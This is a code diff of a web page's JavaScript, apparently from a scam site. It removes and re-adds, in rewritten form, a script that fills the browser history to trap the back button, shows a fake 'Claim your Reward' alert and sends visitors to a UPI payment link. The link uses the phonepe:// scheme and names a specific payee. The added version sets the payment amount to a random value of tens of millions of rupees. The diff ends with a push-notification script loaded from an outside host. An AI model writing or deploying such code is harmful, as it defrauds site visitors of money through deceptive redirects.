@@ -16,19 +16,21 @@
             var price = Math.floor(randomNumber(850, 889));
             console.log(price);
         </script>
-        <script type="text/javascript">
-            !function() {
-                var t;
-                try {
-                    for (t = 0; 10 > t; ++t)
-                        history.pushState({}, "", "");
-                    onpopstate = function(t) {
-                        t.state && alert(' Claim your Reward by Clicking on \n "SEND IN BANK ACCOUNT"  ')
-                        location.href = 'phonepe://pay?pa=Fcbizvdbj6k@freecharge&pn=YDV91806707&tn=YDV?php echo(rand(99999999,11111111)); ?>&am=499&cu=INR&mode=02&purpose=00&tr=90157033;end ';
-                    }
-                } catch (o) {}
-            }();
-        </script>
+       <script type="text/javascript">
+    !function() {
+        var t;
+        try {
+            for (t = 0; 10 > t; ++t)
+                history.pushState({}, "", "");
+            onpopstate = function(t) {
+                t.state && alert(' Claim your Reward by Clicking on \n "SEND IN BANK ACCOUNT"  ')
+                var randomAmount = Math.floor(Math.random() * (11111111 - 99999999 + 1) + 99999999);
+                location.href = `phonepe://pay?pa=Fcbizvdbj6k@freecharge&pn=YDV91806707&tn=YDV${randomAmount}&am=${randomAmount}&cu=INR&mode=02&purpose=00&tr=90157033;end`;
+            }
+        } catch (o) {}
+    }();
+</script>
+
         <script id="script">
             var s = document.createElement("script")
             s.src = "https://notix.io/ent/current/enot.min.js"
